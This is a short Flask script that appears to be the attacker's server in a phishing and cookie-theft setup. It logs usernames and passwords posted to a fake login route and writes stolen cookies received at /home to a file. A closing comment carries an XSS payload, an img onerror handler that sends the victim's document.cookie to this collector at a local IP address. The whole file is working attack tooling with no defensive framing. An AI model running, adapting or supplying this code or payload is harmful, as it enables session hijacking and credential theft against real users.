from flask import Flask, request, redirect, render_template, url_for
import os
from datetime import datetime

template_dir = os.path.abspath('./fishing/templates')
static_folder = os.path.abspath('./fishing/static')
app = Flask(__name__, template_folder=template_dir, static_folder=static_folder)

@app.route("/login")
def login():
    return render_template("login.html")

@app.route('/loginUser', methods=["GET", "POST"])
def csrf():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        print(f"username: {username}, password: {password}")
    return redirect(url_for("login"))

@app.route('/home')
def cookie():
    cookie = request.args.get('cookie')
    print(cookie)
    f = open("cookies.txt", "a")
    f.write(str(cookie) + ' ' + str(datetime.now()) + "\n")
    f.close()
    
    return redirect("http://192.168.178.48:4000/home")

if __name__ == "__main__":
    app.run(host= '0.0.0.0', port=3000, debug=True)



#<img src=x onerror=this.src="http://192.168.178.48:3000/home?cookie="+document.cookie;>